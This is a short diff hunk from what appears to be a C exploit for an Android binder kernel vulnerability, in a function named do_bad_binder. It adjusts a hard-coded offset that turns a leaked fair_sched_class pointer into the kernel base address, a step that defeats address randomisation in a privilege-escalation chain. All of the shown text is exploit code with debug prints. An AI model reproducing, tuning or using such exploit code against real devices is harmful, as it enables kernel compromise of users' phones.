@@ -548,7 +548,7 @@ int32_t do_bad_binder(uint64_t* ppTaskStruct, uint64_t* ppThreadInfo, uint64_t* 
 
     printf("[!] fair_sched_class: %lx\n", *pFairSchedClass);
 
-    *ppKernelBase = *pFairSchedClass - 0xBD5800;
+    *ppKernelBase = *pFairSchedClass -  0xBD5638;
 
     printf("[!] kernel base %lx\n", *ppKernelBase);
 
